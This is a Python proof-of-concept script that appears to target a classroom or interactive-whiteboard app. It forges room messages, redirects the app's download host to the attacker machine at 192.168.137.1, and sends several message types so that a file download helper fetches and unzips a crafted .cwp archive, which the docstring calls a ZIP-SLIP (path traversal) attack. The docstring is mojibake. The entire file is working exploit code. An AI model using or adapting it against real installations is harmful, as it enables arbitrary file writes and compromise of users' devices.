# -*- coding: utf-8 -*-
"""inject_cwp.py - 鐢?.cwp URL 瑙﹀彂 InteractionCwpDownloadAndUnZipHelper 涓嬭浇+瑙ｅ帇(ZIP-SLIP)銆?"""
import json
import os
import time

BASE = os.path.dirname(os.path.abspath(__file__))
INJ = os.path.join(BASE, "ws_inject.txt")
OUR = "192.168.137.1"
ROOM = "UXHOVJJF"
UID = "2112229"
URL = "http://%s/poc.cwp" % OUR


def msg(mtype, data, cid, tag="canvas_tag", cmd=2):
    return json.dumps({
        "cId": cid, "cmd": cmd, "from": "10001", "gt": 0, "id": "1349658", "rt": 1,
        "smsg": {"classRoomId": ROOM, "createTag": tag, "data": data,
                 "forward": 0, "senderId": 0, "type": mtype, "userIds": UID},
        "tags": ["RWYZKUIF"]}, ensure_ascii=False)


def inj(js, label, wait=9):
    with open(INJ, "w", encoding="utf-8") as f:
        f.write(js)
    print("INJ %s" % label, flush=True)
    time.sleep(wait)


def main():
    ftp = {"hostName": OUR, "port": 8080, "rootPath": "/mnt/sdcard/xhproxy",
           "downloadWaitTime": 3, "startLimitRate": 0.015}
    inj(msg(50001, json.dumps(ftp, ensure_ascii=False), "179P00020", "default_tag", cmd=0),
        "50001", 8)

    files = {"url": URL, "fileUrl": URL, "downloadUrl": URL, "resourceUrl": URL,
             "path": URL, "sourceUrl": URL, "cwpUrl": URL}
    bean = {"resourceId": "LAB_R1", "taskId": "LAB_T1", "subTaskId": "LAB_S1",
            "deskTopId": "", "status": 1, "resourceType": 1, "taskStatus": 1,
            "pptSource": 1, "name": "poc.cwp", "type": ".cwp", "size": 7282,
            "viewedIds": "", "viewedNum": 0, "originTotalNumber": 1}
    bean.update(files)

    for mt, nm in ((6, "type6 .cwp"), (20003, "20003 .cwp"), (20005, "20005 .cwp"),
                   (4, "type4 .cwp"), (5, "type5 .cwp")):
        inj(msg(mt, json.dumps(bean, ensure_ascii=False), "179P00021"), nm, 9)
    for mt, nm in ((6, "type6 .cwp list"), (20005, "20005 .cwp list")):
        inj(msg(mt, json.dumps([bean], ensure_ascii=False), "179P00022"), nm, 9)
    print("done", flush=True)


if __name__ == "__main__":
    main()

